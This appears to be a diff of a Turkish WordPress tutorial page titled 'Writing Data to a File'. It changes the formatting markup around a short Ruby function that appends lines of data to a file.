 <h1 class="wp-block-heading" id="bir-dosyaya-veri-yazma">Bir Dosyaya Veri Yazma 
 <!-- /wp:heading -->
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">def filewrt<strong>(</strong>file2wrt, data2wrt<strong>)</strong>
-        output <strong>=</strong> ::File.open<strong>(</strong>file2wrt, "a"<strong>)</strong>
-        data2wrt.each_line <strong>do</strong> |d|
-                output.puts<strong>(</strong>d<strong>)</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">def filewrt***(*** file2wrt, data2wrt***)*** 
+        output ***=***  ::File.open***(*** file2wrt, "a"***)*** 
+        data2wrt.each_line ***do***  |d|
+                output.puts***(*** d***)*** 
         end
         output.close
 end</code></pre>
